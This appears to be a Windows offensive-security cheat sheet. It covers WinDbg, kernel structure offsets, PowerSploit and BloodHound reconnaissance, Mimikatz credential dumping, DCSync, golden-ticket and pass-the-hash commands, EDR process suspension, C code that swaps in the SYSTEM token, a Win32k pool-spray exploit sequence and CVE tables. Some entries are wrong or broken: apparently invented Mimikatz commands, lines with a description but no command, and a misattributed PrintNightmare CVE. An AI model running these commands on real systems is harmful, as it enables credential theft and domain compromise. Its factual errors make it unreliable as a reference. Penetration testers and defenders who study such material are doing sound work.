# Windows Security & Internals — Quick Reference Cheatsheet

---

## WinDbg Essential Commands

### Process & Thread
```
!process 0 0                     List all processes (name + EPROCESS)
!process 0 7 <name>              Detailed process info
.process /r /p <EPROCESS>        Switch to process context (refresh CR3)
.process /r /m <EPROCESS>        Switch + reload modules

!thread                          Current thread info
.thread <ETHREAD>                Switch to thread context
~* k                             All threads stack traces
!stacks 0 <filter>              Find threads by module/function

dt nt!_EPROCESS <addr>           Dump EPROCESS structure
dt nt!_EPROCESS Token <addr>     Token offset (for exploitation)
dt nt!_ETHREAD <addr>           Dump ETHREAD structure
dt nt!_KTHREAD <addr>           Dump KTHREAD (kernel thread)
dt nt!_TOKEN <addr>              Dump TOKEN structure
```

### Object & Handle
```
!object <addr>                   Object info
!handle <handle> <flags> <pid>   Handle info
!handle 0 f <pid>                List all handles for process
dt nt!_OBJECT_HEADER <addr>    Object header
dt nt!_OBJECT_TYPE <addr>       Object type info
.poolfind <tag>                  Find pool allocations by tag
!poolfind <tag>                  Find pool allocations by tag
```

### Memory & Pool
```
dd <addr>                        Dump DWORDs at address
dq <addr>                        Dump QWORDs at address
db <addr>                        Dump bytes
du <addr>                        Dump UNICODE_STRING
dc <addr>                        Dump DWORDs + ASCII
!address <addr>                  Virtual address info
!vprot <addr>                    Page protection info
!pool <addr>                     Pool header info
!poolfind <tag>                  Find pool by tag

ed <addr> <value>                Write DWORD
eq <addr> <value>                Write QWORD
eb <addr> <value>                Write BYTE
```

### Breakpoints & Control
```
bp <addr>                        Set breakpoint
bp <module>!<symbol>             Symbolic breakpoint
bp /p <EPROCESS> <addr>          Process-specific breakpoint
bp /t <ETHREAD> <addr>           Thread-specific breakpoint
bu <module>!<symbol>            Unresolved breakpoint (deferred)
ba w4 <addr>                     Hardware write breakpoint (4 bytes)
ba r1 <addr>                     Hardware read breakpoint (1 byte)
bl                               List breakpoints
bc <n>                           Clear breakpoint
bd <n>                           Disable breakpoint
be <n>                           Enable breakpoint
g                                Continue (Go)
pt                               Step to next return (Step Out)
t                                Step Into (Trace)
p                                Step Over

.breakin                         Break into target (kernel debugger)
                   Force break into debuggee
```

### Disassembly & Modules
```
u <addr>                         Unassemble (disassemble)
u <module>!<symbol> L20         Disassemble 20 instructions
ub <addr>                        Unassemble backward
ln <addr>                        Nearest symbol
lm                               List modules
lm m <pattern>                   List modules matching pattern
!drvflags <addr>                 Driver flags

kd> .exepath <path>              Set executable path
kd> .sympath <path>              Set symbol path
kd> .reload /f                   Force reload symbols
```

### Advanced
```
!process 0 1 <name>             Process with full details
!process 0 ff <name>            All process details
!object \Device\<name>           Object manager info
!irp <addr>                     IRP info
!devobj <addr>                   Device object info
!devstack <addr>                 Device stack
!crypto                          Crypto provider info
.kdfiles <map> <replace>         Map driver files
.writemem <file> <range>         Dump memory to file
!exploitable <crash>             Assess crash exploitability (MSEC)

                   Search memory
s -d <start> L<length> <pattern>       Search DWORDs
s -q <start> L<length> <pattern>       Search QWORDs
s -a <start> L<length> "<string>"      Search ASCII
s -u <start> L<length> "<unicode>"     Search UNICODE
```

---

## Key Windows Kernel Structures

### _EPROCESS (x64, offsets vary by build)
```
+0x000 Pcb              : _KPROCESS
+0x2F0 ProcessLock      : _EX_PUSH_LOCK
+0x440 UniqueProcessId  : Ptr64 Void        (PID)
+0x448 ActiveProcessLinks: _LIST_ENTRY      (process list)
+0x4C8 Token            : _EX_FAST_REF       ← TOKEN POINTER (exploitation target)
+0x6B8 ObjectTable      : Ptr64 _HANDLE_TABLE
+0x798 Peb              : Ptr64 _PEB
+0x858 ImageFileName    : [15] UChar
+0x960 InheritedFromUniqueProcessId: Ptr64 Void
+0x9B8 ProtectionLevel : Uint4B
```

### _KTHREAD (selected fields)
```
+0x000 Header            : _DISPATCHER_HEADER
+0x098 StackBase          : Ptr64 Void
+0x0A0 StackLimit         : Ptr64 Void
+0x0C0 TrapFrame          : Ptr64 _KTRAP_FRAME      ← RIP control
+0x158 ApcState           : _KAPC_STATE
+0x1C0 PreviousMode       : UChar                    ← 0=kernel, 1=user
+0x220 Process            : Ptr64 _KPROCESS
```

### _TOKEN (selected fields)
```
+0x000 TokenSource        : _TOKEN_SOURCE
+0x018 TokenId            : _LUID
+0x020 AuthenticationId   : _LUID
+0x028 ParentTokenId      : _LUID
+0x030 ExpirationTime     : _LARGE_INTEGER
+0x040 Privileges         : _SEP_TOKEN_PRIVILEGES
+0x070 UserAndGroups      : Ptr64 _SID_AND_ATTRIBUTES
+0x098 RestrictedSids     : Ptr64 _SID_AND_ATTRIBUTES
+0x0B0 PrimaryGroup      : Ptr64 Void
+0x0E0 IntegrityLevel    : Ptr64 _SID
```

### _OBJECT_HEADER (x64)
```
+0x000 PointerCount      : Int64B
+0x008 HandleCount       : Int64B
+0x010 NextToFree        : Ptr64 Void
+0x018 Lock              : _EX_PUSH_LOCK
+0x020 TypeIndex         : UChar                    ← type confusion target
+0x021 TraceFlags       : UChar
+0x028 SecurityDescriptor: Ptr64 Void
+0x030 Body              : <object data starts here>
```

### _POOL_HEADER (x64)
```
+0x000 PreviousSize     : Pos 0, 8 Bits
+0x000 PoolIndex        : Pos 8, 8 Bits
+0x002 BlockSize        : Pos 0, 8 Bits
+0x002 PoolType         : Pos 8, 8 Bits
+0x004 PoolTag          : Uint4B                    ← pool identification tag
+0x008 ProcessBilled   : Ptr64 _EPROCESS
+0x008 Reserved         : Uint8B
```

### Integrity Levels (Quick Ref)
```
Untrusted  S-1-16-0      0x0000  (AppContainer sandbox)
Low        S-1-16-4096   0x1000  (Protected Mode IE)
Medium     S-1-16-8192   0x2000  (Standard User)
High       S-1-16-12288  0x3000  (Elevated Admin)
System     S-1-16-16384  0x4000  (SYSTEM)
Process    S-1-16-20480  0x5000  (Protected Process)
```

---

## PowerShell / PowerSploit One-Liners

### Reconnaissance
```powershell
# System info
Get-ComputerInfo | Select-Object OsName, OsVersion, OsBuild, OsArchitecture

# Privilege check
whoami /priv
whoami /groups

# List local admins
net localgroup Administrators

# Check for unquoted service paths
Get-WmiObject win32_service | Where-Object {$_.PathName -notlike '"*"' -and $_.PathName -like '* *'} | Select-Object Name, PathName

# Find writable service directories
Get-WmiObject win32_service | ForEach-Object { $path = (Split-Path $_.PathName.Replace('"','')); if(Test-Path $path) { $acl = Get-Acl $path; if($acl.Access | Where-Object {$_.FileSystemRights -match 'Write' -and $_.IdentityReference -match 'Users'}) { $_.Name } } }

# Enumerate AD users
Get-ADUser -Filter * -Properties PasswordLastSet,LastLogonDate | Select-Object Name,PasswordLastSet,LastLogonDate

# Find domain admins
Get-ADGroupMember "Domain Admins" -Recursive | Select-Object Name,DistinguishedName

# Check AppLocker policy
Get-AppLockerPolicy -Effective | Format-List
Get-AppLockerPolicy -Domain -LDAP "LDAP://DC=corp,DC=local" | Format-List
```

### PowerSploit
```powershell
# Invoke-Mimikatz (dump credentials)
Invoke-Mimikatz -DumpCreds

# Get all domain computers
Get-NetComputer -FullData

# Find local admins on remote machines
Invoke-EnumerateLocalAdmin

# Find sessions where domain admins are logged in
Get-NetSession -ComputerName <dc>

# Get SPN users (Kerberoasting targets)
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# Get AS-REP roastable users
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# Find delegation (constrained/unconstrained)
Get-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto

# Check for unconstrained delegation
Get-DomainComputer -Unconstrained | Select-Object Name

# Invoke-BloodHound data collection
Invoke-BloodHound -CollectionMethod All -Domain corp.local

# PowerUp: find local priv esc vectors
Invoke-AllChecks

# Check for unquoted service paths
Get-UnquotedService

# Check for modifiable service binaries
Get-ModifiableService

# Find writable registry paths
Get-RegistryAlwaysInstallElevated
```

---

## Mimikatz Command Reference

### Credential Dumping
```
mimikatz # privilege::debug                  Enable SeDebugPrivilege
mimikatz # sekurlsa::logonpasswords          Dump all plaintext passwords & hashes
mimikatz # sekurlsa::wdigest                 Dump WDigest passwords
mimikatz # sekurlsa::kerberos                Dump Kerberos tickets
mimikatz # sekurlsa::tikerg                  Dump Tikerg tickets
mimikatz # lsadump::sam                      Dump SAM database (local hashes)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt   DCSync (extract hash from DC)
mimikatz # lsadump::dcsync /domain:corp.local /all /csv      DCSync all domain users
mimikatz # lsadump::lsa /patch               Dump LSA secrets
mimikatz # lsadump::cache                    Dump Domain Cached Credentials
mimikatz # vault::cred                       Dump Windows Vault credentials
```

### Kerberos Attacks
```
mimikatz # kerberos::list /export            Export all TGT/TGS tickets
mimikatz # kerberos::ptt <kirbi_file>        Pass the ticket
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt
                                               Golden Ticket
mimikatz # kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:sql01.corp.local /service:MSSQLSvc /rc4:<hash> /ptt
                                               Silver Ticket
```

### Pass-the-Hash / Over-Pass-the-Hash
```
mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:<hash> /run:cmd.exe
                                               Pass-the-Hash
mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:<hash> /aes256:<key> /run:powershell
                                               Over-Pass-the-Hash (Kerberos)
```

### LSA Protection Bypass
```
mimikatz # sekurlsa::minidump lsass.dmp      Load LSASS dump file
mimikatz # sekurlsa::logonpasswords /full     Full dump (including domain)
mimikatz # !lsadump::lsa /inject /name:lsass Direct injection
mimikatz # misc::memssp                      Inject SSP to capture passwords on next logon
```

### EDR Evasion
```
mimikatz # process::suspend <pid>             Suspend EDR process
mimikatz # crypto::system                     System-level operations
mimikatz # misc::mask                         Mask Mimikatz in memory
```

---

## BloodHound Cypher Queries

### Attack Path Analysis
```cypher
// Shortest path from Domain Users to Domain Admins
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p

// Find all paths to a specific computer
MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name:'DC01.CORP.LOCAL'}))
RETURN p

// Users with AdminCount=1 (potential hidden admins)
MATCH (u:User {admincount:True}) RETURN u.name,u.displayname

// Find DAs with sessions on non-DC machines (BAD!)
MATCH (da:User)-[:MemberOf]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),
      (da)-[:HasSession]->(c:Computer)
WHERE NOT c.name STARTS WITH 'DC'
RETURN da.name, c.name

// Kerberoastable users with cracked-worthy hashes
MATCH (u:User {hasspn:true})
WHERE NOT u.name STARTS WITH 'KRBTGT' AND u.enabled=true
RETURN u.name, u.displayname, u.pwdlastset

// AS-REP roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

// Computers with unconstrained delegation (high risk)
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// Users with unconstrained delegation (VERY high risk)
MATCH (u:User {unconstraineddelegation:true}) RETURN u.name

// Find users that can reset passwords of other users
MATCH (u:User)-[:GenericAll]->(v:User) RETURN u.name, v.name

// Find users with ForceChangePassword on other users
MATCH (u:User)-[:ForceChangePassword]->(v:User) RETURN u.name, v.name

// Shortest owned path to DA (from owned nodes)
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p

// Find cross-domain trust paths
MATCH (d1:Domain)-[:TrustedBy]->(d2:Domain) RETURN d1.name, d2.name

// Find users with AdminTo on multiple computers (lateral movement risk)
MATCH (u:User)-[:AdminTo]->(c:Computer)
WITH u, count(c) as numComputers
WHERE numComputers > 3
RETURN u.name, numComputers ORDER BY numComputers DESC
```

---

## Common Misconfiguration Checks

### Service Misconfigurations
```powershell
# Unquoted service paths
Get-WmiObject win32_service | Where-Object {$_.PathName -notlike '"*"' -and $_.PathName -like '* *'} | Select-Object Name,PathName,StartName

# Writable service binaries
Get-WmiObject win32_service | ForEach-Object { $_.PathName -replace '"','' } | ForEach-Object { $f=$_.Split()[0]; if(Test-Path $f) { (Get-Acl $f).Access | Where-Object {$_.FileSystemRights -match 'Write'} } }

# Service with weak permissions (PowerUp)
Get-ServiceUnquoted -Verbose
Get-ModifiableService -Verbose
Get-ModifiableServiceFile -Verbose

# AlwaysInstallElevated
Get-ItemProperty HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Get-ItemProperty HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
```

### Registry & Filesystem
```powershell
# Writable directories in PATH
$env:Path -split ';' | Where-Object { Test-Path $_ } | Where-Object { (Get-Acl $_).Access | Where-Object { $_.FileSystemRights -match 'Write' -and $_.IdentityReference -match 'BUILTIN\\Users' } }

# AutoRun programs (check for DLL hijack)
Get-ItemProperty HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Scheduled tasks (check for writable task files)
Get-ScheduledTask | Where-Object {$_.Principal.UserId -match 'SYSTEM' -or $_.Principal.LogonType -match 'S4U'} | Select-Object TaskName,State,Principal

# Credential files
dir C:\Users\*\AppData\Local\Microsoft\Credentials\* -ErrorAction SilentlyContinue
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\* -ErrorAction SilentlyContinue
```

### Network &.Authentication
```powershell
# NTLM audit
Get-ItemProperty HKLM\SYSTEM\CurrentControlSet\Control\Lsa -Name LmCompatibilityLevel -ErrorAction SilentlyContinue

# Check for SMB signing
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature

# Check for LDAP signing
Get-ItemProperty HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters -Name LDAPServerIntegrity -ErrorAction SilentlyContinue

# Check Print Spooler
Get-Service Spooler | Select-Object Name,Status,StartType

# Check for LSA Protection
Get-ItemProperty HKLM\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -ErrorAction SilentlyContinue

# Check Credential Guard
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

---

## Privilege Escalation Checklist

### Information Gathering
- [ ] `whoami /all` — Check user, groups, privileges, integrity level
- [ ] `systeminfo` — OS version, hotfixes, architecture
- [ ] `net user /domain` — Domain user enumeration
- [ ] `net group "Domain Admins" /domain` — DA enumeration
- [ ] Check for `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` → Potato attacks
- [ ] Check for `SeDebugPrivilege` → Process injection / LSASS dump
- [ ] Check for `SeLoadDriverPrivilege` → BYOVD
- [ ] Check for `SeTakeOwnershipPrivilege` → File takeover
- [ ] Check integrity level — Medium vs High vs System

### Local Escalation
- [ ] Unquoted service paths
- [ ] Weak service permissions (service binary path modification)
- [ ] Unattended install files (`unattend.xml`, `sysprep.xml`)
- [ ] Stored credentials in registry (`HKLM\SOFTWARE\*\*`, `HKCU\SOFTWARE\*\*`)
- [ ] Saved credentials (`cmdkey /list`, Windows Credential Manager)
- [ ] AlwaysInstallElevated
- [ ] DLL search order hijacking
- [ ] Scheduled tasks running as SYSTEM with writable paths
- [ ] Startup folder writability
- [ ] ACL on service executables
- [ ] Token impersonation (potato family if `SeImpersonatePrivilege`)
- [ ] RunAs saved credentials (`C:\Users\*\AppData\Local\Microsof\Credentials`)
- [ ] Browser stored credentials (Chrome, Firefox)
- [ ] WiFi passwords (`netsh wlan show profiles`)

### Domain Escalation
- [ ] Kerberoasting (`Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname`)
- [ ] AS-REP roasting (`Get-DomainUser -PreauthNotRequired`)
- [ ] Unconstrained delegation (`Get-DomainComputer -Unconstrained`)
- [ ] Constrained delegation with protocol transition
- [ ] Resource-Based Constrained Delegation (RBCD)
- [ ] ACL abuse (GenericAll, WriteDacl, WriteOwner, ForceChangePassword)
- [ ] DNS Admins group membership (DLL load)
- [ ] GPO modification rights
- [ ] DCSync replication rights
- [ ] AD CS template abuse (ESC1-ESC8)
- [ ] LAPS password read
- [ ] gMSA password read

---

## Kernel Exploitation Cheat Sheet

### Pool Spray Targets (Windows 10/11)
| Object | Pool Tag | Size (x64) | Creation API |
|--------|----------|------------|-------------|
| `_SURFACE` (Bitmap) | Gla8 / Ula8 | Variable | `CreateBitmap(width, height, 1, 32, NULL)` |
| `MENU` | Mn8 / Mm8 | 0xA0 | `CreateMenu()` |
| `WNDOBJ` | Usg8 | ~0x280 | `CreateWindowEx(...)` |
| `PALETTE` | Gh08 / Gh18 | Variable | `CreatePalette(...)` |
| `EVENT` | Eve8 | 0x40 | `CreateEvent(NULL, FALSE, FALSE, NULL)` |
| `SEMAPHORE` | Sem8 | 0x40 | `CreateSemaphore(NULL, 0, 1, NULL)` |
| `NAMED_PIPE` buffer | Np8 | Variable (size-controlled) | `CreateNamedPipe(...)` |
| Registry key value | Cm8 | Variable (size-controlled) | `RegSetValueEx(...)` |
| `_IO_TIMER` | Iot8 | 0x40 | `IoInitializeTimer(...)` |

### Token Replacement Pattern
```c
// Data-only kernel exploitation: replace EPROCESS.Token
// Required: arbitrary kernel write primitive (8 bytes)

// 1. Find System EPROCESS (PID 4)
PVOID systemEprocess = /* enumerate ActiveProcessLinks or PsInitialSystemProcess */;

// 2. Find target (our) EPROCESS
PVOID targetEprocess = PsGetCurrentProcess(); // or find by PID

// 3. Read Token offset (build-dependent)
// Win10 21H2: Token is at offset +0x4C8 in EPROCESS
ULONG64 tokenOffset = 0x4C8; // verify for your build

// 4. Read System token value
ULONG64 systemToken = *(PULONG64)((PCHAR)systemEprocess + tokenOffset);

// 5. Write System token to our process
*(PULONG64)((PCHAR)targetEprocess + tokenOffset) = systemToken;

// 6. Done — our process now has SYSTEM privileges
// Alternative: modify _SECURITY_DESCRIPTOR or ACL instead of full token swap
```

### Common Kernel Win Conditions
| Write Primitive | Target | Effect |
|----------------|--------|--------|
| Arbitrary 8-byte write | `_EPROCESS.Token` | Full SYSTEM token replacement |
| Arbitrary 8-byte write | `_KTHREAD.PreviousMode` | Set to 0 → all subsequent `Nt*` calls treat caller as kernel |
| Arbitrary 8-byte write | Process DACL in `_TOKEN` | Grant all access (Read/Write/Execute) |
| Arbitrary 8-byte write | Function pointer in dispatch table | RIP control (bypassed by kCFI) |
| Arbitrary 8-byte write | `_POOL_HEADER.PoolTag` | Pool corruption detection bypass |
| Arbitrary read | `_EPROCESS.ActiveProcessLinks` | Kernel address leak (KASLR defeat) |
| Arbitrary read | `_TOKEN.Privileges` | Determine current privilege set |
| Arbitrary read | `_OBJECT_HEADER.TypeIndex` | Object type identification |

### Win32k Exploitation Pattern
```
1. Trigger vulnerability (e.g., integer truncation in GDI call)
2. Pool spray to fill adjacent objects (CreateBitmap/CreatePalette)
3. Free every other spray object to create holes
4. Trigger overflow/UAF into adjacent SURFACE object
5. Corrupt SURFACE.pvBits0 → arbitrary kernel read/write
6. Read System EPROCESS.Token
7. Write System EPROCESS.Token into our EPROCESS
8. Done — SYSTEM shell
```

---

## Windows Mitigations Summary Table

| Mitigation | Introduced | Applies To | Blocks | Bypass |
|-----------|-----------|-----------|--------|--------|
| DEP/NX | XP SP2 | User+Kernel | Shellcode on stack/heap | ROP, ret2libc, JIT spray |
| ASLR | Vista | User+Kernel | Hardcoded addresses | Info leak, partial overwrite |
| Stack Cookies (/GS) | VS 2003 | User | Linear stack overflow | Info leak, exception handler overwrite |
| SEHOP | Vista | User | SEH chain overwrite | Info leak, anti-SEHOP techniques |
| Heap Validation | Win8 | User+Kernel | Heap metadata corruption | UAF, data-only attacks |
| CFG | Win8.1 | User | Forward-edge indirect call hijack | Fake dispatch, data-only |
| kCFG | Win10 RS2 | Kernel | Kernel indirect call hijack | Data-only, function confusion |
| ACG | Win10 RS1 | User | Dynamic code generation in process | Code from legitimate modules |
| CIG | Win10 RS1 | User | DLL injection from untrusted paths | Path traversal, COM hijack |
| VBS/HVCI | Win10 RS3 | Kernel | Kernel code modification (EPT) | Data-only attacks, bootkit |
| Kernel CET | Win11 21H2 | Kernel | ROP via shadow stack | JOP, data-only |
| kCFI | Win11 24H2 | Kernel | Indirect call type confusion | Data-only, function confusion |
| Pool Hardening | Win10 19H1 | Kernel | Pool header/block corruption | UAF (doesn't corrupt headers) |
| KVAS Shadow | Win10 1803 | Kernel | Meltdown (user→kernel read) | Alternative info leaks |
| Credential Guard | Win10 | User | LSASS credential theft | VTL 0 → VTL 1 transition attacks |
| LSA Protection | Win8.1 | User | LSASS process injection | Kernel driver, BYOVD |
| WDAC | Win10 | User+Kernel | Unsigned code execution | Config vulnerabilities |
| Secure Boot | Win8 | Boot | Bootkits | VM escapes, SMM attacks |

---

## Key CVE Quick-Reference Table

### Windows Kernel / Win32k EoP
| CVE | Component | Type | CVSS | Notes |
|-----|-----------|------|------|-------|
| CVE-2021-1732 | win32kfull | Callback desync (OOB write) → LPE | 7.8 | xxxCreateWindowEx callback; in-the-wild, CISA KEV |
| CVE-2022-21882 | Win32k | 1732 variant | 7.8 | Variant of 1732, bypassed fix |
| CVE-2020-17087 | cng.sys | Pool overflow | 7.8 | Google PZ tracked |
| CVE-2019-1458 | Win32k | Uninitialized var / arbitrary ptr deref → LPE | 7.8 | Operation WizardOpium (chained w/ Chrome CVE-2019-13720) |
| CVE-2020-1054 | Win32k | OOB write via DrawIconEx (SURFOBJ pvbits) | 7.8 | Bitmap corruption |
| CVE-2018-8440 | ALPC | TOCTOU | 7.8 | Task scheduler race |
| CVE-2021-1648 | Print Spooler | TOCTOU | 7.8 | Driver load race |

### PrintNightmare Family
| CVE | Component | Type | CVSS | Notes |
|-----|-----------|------|------|-------|
| CVE-2021-1673 | Print Spooler | Auth RCE | 7.8 | Original PrintNightmare |
| CVE-2021-34527 | Print Spooler | Authenticated RCE (PR:L) | 8.8 | PrintNightmare, remote variant |
| CVE-2021-36958 | Print Spooler | RCE as SYSTEM (PrintNightmare family) | 7.8 | Print spooler RCE |

### Remote / Browser
| CVE | Component | Type | CVSS | Notes |
|-----|-----------|------|------|-------|
| CVE-2021-40444 | MSHTML | Remote code execution | 8.8 | Office + HTML RCE |
| CVE-2024-21412 | SmartScreen / MOTW | Internet Shortcut security feature bypass | 8.1 | SmartScreen bypass |
| CVE-2023-36884 | Office/HTML | RCE | 8.8 | Office chain |
| CVE-2023-44487 | HTTP/2 | DDoS | 7.5 | HTTP/2 Rapid Reset |

### Active Directory
| CVE | Component | Type | CVSS | Notes |
|-----|-----------|------|------|-------|
| CVE-2022-26923 | AD CS | Privilege escalation | 8.8 | AD CS template abuse |
| CVE-2021-42287 | AD | Privilege escalation | 8.8 | sAMAccountName confusion |
| CVE-2025-21298 | OLE (ole32.dll) | Zero-click UAF RCE via RTF in Outlook | 9.8 | OLE RCE |

### BYOVD Drivers
| CVE | Driver | Primitive | Notes |
|-----|--------|-----------|-------|
| CVE-2021-21551 | Dell dbutil_2_3.sys | Kernel R/W | Write-what-where via exposed IOCTL |
| CVE-2023-32545 | (miscited: actually Horner Cscape OOB read, not Dell dbutil) | — | — |
| CVE-2019-16098 | MSI Afterburner RTCore64.sys | Kernel R/W (arbitrary MSR/IO) | Gaming driver |
| N/A | Capcom.sys | Kernel R/W | Intentionally vulnerable |
| N/A | RTCore64.sys | Kernel R/W | MSI Afterburner |
| N/A | atillk64.sys | Kernel R/W | ASUS GPU Tweak |

---

## Quick Reference: Potato Attack Family

| Name | Year | Mechanism | Requirements | Works On |
|------|------|-----------|-------------|----------|
| RottenPotato | 2016 | DCOM/BITS NTLM relay + named pipe impersonation | `SeImpersonatePrivilege` | Win7-2016 |
| JuicyPotato | 2018 | RottenPotato + CLSID selection | `SeImpersonatePrivilege` | Win7-2019 |
| SweetPotato | 2020 | All potato techniques in one | `SeImpersonatePrivilege` | All versions |
| RoguePotato | 2020 | NTLM relay via port 135 redirector | `SeImpersonatePrivilege` | Win2019+ |
| PrintSpoofer | 2020 | Named pipe impersonation via Spooler | `SeImpersonatePrivilege` | All versions |
| GodPotato | 2023 | DCOM/RPCSS OXID resolver abuse (BeichenDream) | `SeImpersonatePrivilege` | All versions |
| RemotePotato | 2021 | NTLM relay across machines | `SeImpersonatePrivilege` + relay target | Domain environments |

## References

1. Russinovich, M. et al. "Windows Internals." 7th Ed. *Microsoft Press*. 2021.
2. Microsoft. "Windows Security Documentation." https://docs.microsoft.com/en-us/windows/security/. 2024.
3. MITRE. "ATT&CK: Windows Techniques." https://attack.mitre.org/techniques/enterprise/. 2024.
4. Microsoft Security Response Center (MSRC). https://msrc.microsoft.com/blog/. 2024.
5. j00ru (Jurczyk, M.). "Windows Kernel Research." https://j00ru.vexillium.org/. 2024.
6. Corelan Team. "Exploit Writing Tutorials." https://www.corelan.be/. 2024.
7. McGarr, C. "Windows Kernel Exploitation." https://connormcgarr.github.io/. 2024.
8. Offensive Security. "EXP-401: Advanced Windows Exploitation." https://www.offsec.com/courses/exp-401/. 2024.